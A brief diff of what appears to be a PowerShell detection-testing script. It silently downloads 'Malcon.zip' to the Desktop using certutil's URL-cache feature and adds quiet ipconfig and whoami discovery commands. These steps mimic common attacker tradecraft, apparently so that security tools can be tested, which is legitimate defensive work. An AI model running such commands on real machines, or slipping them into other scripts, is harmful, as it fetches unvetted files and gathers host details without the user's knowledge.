@@ -3,4 +3,6 @@ $downloadUrl = "https://github.com/choro511/detection-testing/raw/refs/heads/mai
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $outputPath = Join-Path $desktopPath "Malcon.zip"
 
+ipconfig | Out-Null
+whoami | Out-Null
 certutil -urlcache -split -f $downloadUrl $outputPath | Out-Null
